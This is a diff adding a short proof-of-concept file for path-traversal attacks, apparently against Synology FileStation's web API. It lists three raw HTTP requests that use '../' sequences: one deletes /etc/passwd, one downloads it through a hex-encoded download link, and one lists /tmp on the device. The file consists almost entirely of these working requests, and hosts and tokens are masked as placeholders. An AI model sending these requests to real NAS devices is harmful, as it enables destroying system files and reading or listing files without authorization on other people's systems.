@@ -1,0 +1,36 @@
+- Delete /etc/passwd
+===========================================
+POST /webapi/FileStation/file_delete.cgi HTTP/1.1
+Host: X.X.X.X:5000
+X-SYNO-TOKEN: XXXXXXXX
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 103
+Cookie: stay_login=0; id=kjuYI0HvD92m6
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+path=/test/../../etc/passwd&accurate_progress=true&api=SYNO.FileStation.Delete&method=start&version=1
+===========================================
+
+- Arbitrary file download:
+===========================================
+GET /fbdownload/?dlink=2f746573742f2e2e2f2e2e2f6574632f706173737764 HTTP/1.1
+Host: X.X.X.X:5000
+Connection: keep-alive
+Authorization: Basic XXXXXXXX
+===========================================
+
+2f746573742f2e2e2f2e2e2f6574632f706173737764 -> /test/../../etc/passwd
+
+- Remote file list:
+=========================
+POST /webapi/FileStation/file_share.cgi HTTP/1.1
+Host: X.X.X.X:5000
+X-SYNO-TOKEN: XXXXXXXX
+Content-Length: 75
+Cookie: stay_login=0; id=f9EThJSyRaqJM; BCSI-CS-36db57a1c38ce2f6=2
+
+folder_path=/test/../../tmp&api=SYNO.FileStation.List&method=list&version=1
+
+
